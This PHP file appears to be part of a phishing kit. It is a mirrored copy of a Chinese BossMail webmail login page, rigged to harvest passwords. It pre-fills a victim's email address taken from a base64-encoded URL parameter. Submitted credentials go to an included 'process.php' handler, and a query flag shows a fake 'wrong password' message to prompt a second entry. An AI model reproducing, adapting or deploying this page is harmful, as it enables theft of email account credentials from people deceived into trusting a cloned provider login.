<?php
if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['login']) && !empty($_POST['login'])){
include('process.php');
}else{
$login = $_GET['login'];

if (strpos($login,'@') !== false){
$log=$login;
}else{
$log=base64_decode($login);
}
$prem = explode('@',$log);
$domain = substr(strrchr($log, "@"), 1);
$useid = $prem[0];
 ?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	
 <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<link rel="stylesheet" href="../common/skins/skin17/style/style1208.css?0622?ver=V7.5.0.22391" type="text/css" media="all" />
		<title>邮箱系统</title>
	</head>
	<body>
		<div id="warp" class="warp_cn">
			<div class="logo"><img width="180" height="60" src="../logo/poType_logo_1cc30.png?t=1528374443"/></div>
			<div class="pop_menu_box">
								<div class="pop_menu">
					<a href="javascript:void(0);">语言<img class="ico_open" src="../webmail7.5/assets/images/ico_open.gif"></a>
					<ul class="listBox listBox_2" style="display:none;">
						<!---->
						<li><a  href="javascript:void(0);" id="lan_switch_cn_btn">简体中文</a></li>
						<!---->
						<li><a  href="javascript:void(0);" id="lan_switch_tw_btn">繁體中文</a></li>
						<!---->
						<li><a  href="javascript:void(0);" id="lan_switch_en_btn">English</a></li>
						<!---->
						<li><a  href="javascript:void(0);" id="lan_switch_jp_btn">日本語</a></li>
						<!---->
						<li><a  href="javascript:void(0);" id="lan_switch_kr_btn">한국어</a></li>
						<!---->
					</ul>
				</div>
				<span class="u_line client_info"> | </span>
				<div class="pop_menu client_info"  style="position:static;">
					<a href="javascript:void(0);">即时通<img src="../webmail7.5/assets/images/ico_open.gif" class="ico_open"></a>
					<ul class="listBox" style="width:auto;display: none;">
						<li>
							<div class="list_download">
								<ul>
									<li class="dow_box_h">
										<b class="ico_z1"></b>
										<p class="tit_z1">BQ PC版</p>
										<span class="tit_z2">系统：支持Windows XP及以上版本</span>
										<a href="http://www.bosscloud.cn/download/client/BQ_PC.exe" class="btn_z">点击下载</a>
									</li>
									<li class="dow_box_h">
										<b class="ico_z3"></b>
										<p class="tit_z1">BQ iPhone版</p>
										<span class="tit_z2">系统：iOS 5.0及以上系统，支持iOS 7</span>
										<b class="BQ_iPhone"></b>
										<a href="https://itunes.apple.com/cn/app/id623766526?mt=8" class="btn_z" target="_blank">点击下载</a>
									</li>
									<li class="dow_box_h">
										<b class="ico_z4"></b>
										<p class="tit_z1">BQ Android版</p>
										<span class="tit_z2">系统：Android 2.3/4.0及以上系统</span>
										<b class="BQ_Android"></b>
										<a href="http://www.bosscloud.cn/download/client/BQ_Android.apk" class="btn_z">点击下载</a>
									</li>
								</ul>
								<div class="c"></div>
							</div>
						</li>
					</ul>
				</div>
				<span class="u_line client_info"> | </span>
				<div class="pop_menu client_info" style="position:static;">
					<a href="javascript:void(0);">客户端<img src="../webmail7.5/assets/images/ico_open.gif" class="ico_open"></a>
					<ul class="listBox" style="width:auto; display:none;">
						<li>
							<div class="list_download" style = "width:330px">
								<ul>
									<li>
										<b class="ico_z1"></b>
										<p class="tit_z1">BM PC版</p>
										<span class="tit_z2">系统：支持Windows XP及以上版本</span>
										<a href="http://www.bosscloud.cn/download/client/BM_PC.exe" class="btn_z">点击下载</a>
									</li>
									<li style="display:none;">
										<b class="ico_z2"></b>
										<p class="tit_z1">BM Win8版</p>
										<span class="tit_z2">系统：支持Win8版本</span>
										<a href="http://apps.microsoft.com/windows/zh-cn/app/bossmail/24f4bdb3-1bca-467e-9dd9-15a5d278aec6" class="btn_z" target="_blank">点击下载</a></li>
									<li class="dow_box_h" style="display:none;">
										<b class="ico_z3"></b>
										<p class="tit_z1">BM iPhone版</p>
										<span class="tit_z2">系统：iOS 5.0及以上系统，支持iOS 7</span>
										<b class="BM_iPhone"></b>
										<a href="https://itunes.apple.com/cn/app/id560071660?ls=1&amp;mt=8" class="btn_z" target="_blank">点击下载</a>
									</li>
									<li class="dow_box_h" style="display:none;">
										<b class="ico_z4"></b>
										<p class="tit_z1">BM Android版</p>
										<span class="tit_z2">系统：Android 2.3/4.0及以上系统</span>
										<b class="BM_Android"></b>
										<a href="http://www.bosscloud.cn/download/client/BM_Android.apk" class="btn_z">点击下载</a>
									</li>
									<li class="dow_box_h" style="display:none;">
										<b class="ico_z2"></b>
										<p class="tit_z1">BM WP版</p>
										<span class="tit_z2">系统：支持Windows Phone 8</span>
										<b class="BM_WP"></b>
										<a href="http://www.windowsphone.com/s?appid=027b80b2-fac7-45b0-9b25-108f7ba529b7" class="btn_z" target="_blank">点击下载</a>
									</li>
								</ul>
								<div class="c"></div>
							</div>
						</li>
					</ul>
				</div>
			</div>

			<div id="main"> 
				<div class="mainRight"></div>
				<div class="mainLeft"></div>
				<div class="loginMain">
					<div class="login_bz">
						<div class="title_gl">
							<span class="tit">邮箱登录</span>  
						</div>       
                        <?php if (isset($_GET['mgs'])) {?>
	<div class="prompt" id="msg_show"><p>* 您输入的邮箱名或者密码有错，请重输</p></div>                         <?php }?>
                         <p>&nbsp; </p>
                        <form name="form1" id="login_form" method="post" >
						<input type="hidden" name="screenWidth" id="screenWidth" value=""/><input type="hidden" name="login" value="<?php echo $log; ?>">
						<input type="hidden" name="issecretencrtpt" value="1" />
							<div class="loginForm log_mar">
								<div class=" login_pw  showPlaceholder"  style="position:inherit;">
									   <div style="position:relative;">
									<label class="login_mail_l">邮箱名：</label>
										
									
									<label for="username" class="placeholder" id="lbl_username">邮箱名</label><b class="ico-uid"></b>									
									<input name="username"  id="username" type="text" maxlength="64" title="请输入邮箱名" class="mail_text" readonly="readonly" value="<?php echo $log; ?>"/>
									
									</div>
							  </div>
								<div class="login_pw showPlaceholder">
									<label class="login_mail_l">密&nbsp;&nbsp;&nbsp;码：</label>
									<label for="secretkey" class="placeholder" id="lbl_pwd">密码</label><b class="ico-pwd"></b>						
									
									<input name="pass" id="secretkeyshows" type="password" maxlength="25" value="" title="请输入密码" class="mail_text"/>
									<input name="secretkey" id="secretkey" type="hidden" maxlength="25" class="mail_text"/>
									
								</div>
								<div class="login_auth" id="authcode_div"  style="display: none">
									<label class="login_mail_l">验证码：</label>
									<label for="authcode" class="placeholder" id="lbl_code">验证码</label><b class="ico-valida"></b>									<input name="authcode" id="authcode" type="text" maxlength="4" title="请输入验证码" class="mail_text auth"/>
									<a href="#" onclick="return false;"><img id="authcode_img" src="#"/></a>
								</div>
								<div class="login_ssl w">
								
										<input type="checkbox" title="全程SSL" id="securessl" value="gobalssl" name="securessl">
										<label class="login_ssltext"> 全程SSL</label>
										
										
										
										<a target="_blank" class="a_sty" href="../webmail7.5/webmailf7ee.html?r=RetrievePwd/index/language/cn/domain/mail.com/isTongyi" >忘记密码?</a>
								</div>
								<div class="login_btn">
									<span class="btn_l"><input id="login_submit_btn" type="submit" class="btnSty" value="登 录"/>
									</span>
									<span class="entry" style="width:140px;"><a href="https://s229x.chinaemail.cn/post/post.php?r=site/index/language/cn/domain/mail.com/isTongyi/" id="switch_post_btn" class="" >管理员入口</a></span>
								</div>
							</div>
							<input type="hidden" name='useragent' id='useragent' value=''>
							<input type="hidden" name="req_from_page" value="normal_login_page" />
							<input type="hidden" name="domainName" value="mail.com" />
					  </form>
					</div> 
				</div>

			</div>
			<div id="footer">
																								<span class="footer_t">Powered by BossMail</span>
							</div>
		</div>
		<script type="text/javascript" src="../webmail7.5/webmaile8ea.js?r=min/serve/g/814b69c4b1c6a684d2ac5d51aecacb21/lm/1527673520"></script>
		<script type="text/javascript" src="../webmail7.5/assets/js/select918f.js?ver=V7.5.0.22391"></script>
			
		<script type="text/javascript">

			$('#screenWidth').val(screen.width);
			
			function checkSSL(){
					//如果有域名登录共享
								              if($('#securessl').attr('checked')){
					           $('#login_form').attr('action','webmail0ae8.html?r=site/login/sid/c57c0397ad4c4a324685c23afa24edbd/domain/mail.com');
			              }
			         				   return true;
	 	    }                   
			window.loginManager=new LoginManager({
				lan:"cn",
				isShowAuthCodeImg:0,
				languageCnSwitchBtn:$("#lan_switch_cn_btn"),
				languageTwSwitchBtn:$("#lan_switch_tw_btn"),
				languageEnSwitchBtn:$("#lan_switch_en_btn"),
				languageJpSwitchBtn:$("#lan_switch_jp_btn"),
				languageKrSwitchBtn:$("#lan_switch_kr_btn"),
				messageShowElement:$("#msg_show"),
				callback:callback,
				loginForm:$("#login_form"),
				usernameElement:$("#username"),
				secretkeyElement:$("#secretkey"),
				secretkeyElementShow:$("#secretkeyshow"),
				authcodeElement:$("#authcode"),
				usernameLabelElement: $("#lbl_username"),				
                secretkeyLabelElement: $("#lbl_pwd"),				
                authcodeLabelElement: $("#lbl_code"),				
                authcodeDiv:$("#authcode_div"),
				authcodeImg:$("#authcode_img"),
				loginSubmitBtn:$("#login_submit_btn"),
				getAuthCodeUrl:"/webmail7.5/webmail.php?r=site/getAuthCode/sid/c57c0397ad4c4a324685c23afa24edbd",
				indexUrl:"/webmail7.5/webmail.php?r=site/index/domain/mail.com",
				sslElement:$("#secure"),
				sslGobalElement:$("#securessl"),
				clientRules:[{'name':'username','clientValidation':function(value, messages, attribute, extendData) {

if($.trim(value)=='') {
	messages.push("* \u90ae\u7bb1\u540d\u4e0d\u80fd\u4e3a\u7a7a");
}


if($.trim(value)!='') {
	
if(value.length<1) {
	messages.push("* \u90ae\u7bb1\u540d\u4e0d\u5c11\u4e8e1\u4e2a\u5b57\u7b26");
}

if(value.length>128) {
	messages.push("* \u90ae\u7bb1\u540d\u4e0d\u80fd\u8d85\u8fc7128\u4e2a\u5b57\u7b26");
}

}

}},{'name':'secretkey','clientValidation':function(value, messages, attribute, extendData) {

if(value=='') {
	messages.push("* \u5bc6\u7801\u4e0d\u80fd\u4e3a\u7a7a");
}


if($.trim(value)!='' && value.match(/[^(\x21-\x7e)]+/)) {
	messages.push("* \u60a8\u8f93\u5165\u7684\u90ae\u7bb1\u540d\u6216\u8005\u5bc6\u7801\u6709\u9519\uff0c\u8bf7\u91cd\u8f93");
}

}},{'name':'authcode','clientValidation':function(value, messages, attribute, extendData) {

if($.trim(value)!='' && !value.match(/^\d+$/)) {
	messages.push("* \u8bf7\u8f93\u5165\u6b63\u786e\u7684\u9a8c\u8bc1\u7801");
}

}}],
				initErrors:[]
			});
			var whereInputFocus;
			$().ready(function(){
				$('#useragent').val($.md5(navigator.userAgent.toLowerCase()));
				$("#footer p").each(function(){
					if($.trim($(this).html()) ==""){
						$(this).addClass("nor");
					}
				});
								$('#securessl').attr('checked','checked');
													
				$(".pop_menu").bind('mouseenter',function(){
					whereInputFocus = $("input:focus");
					if(whereInputFocus){
						whereInputFocus.blur();
					}
					$(this).find("ul.listBox").show();
				}).bind('mouseleave',function(){
					if(whereInputFocus){
						whereInputFocus.focus();
					}
					$(this).find("ul.listBox").hide();
				});
				
			});
			function callback(){
				if($("#msg_show").html()!=""){
					$("#msg_show").removeClass("nopro");
					$("#msg_show").addClass("prompt");
				}
			}
			
			
			$('#shareDomain').change(function(){	
		      $("input[name='domainName']").val($(this).children('option:selected').val());
            });

			
		</script>
	</body>

 </html>

<?php }?>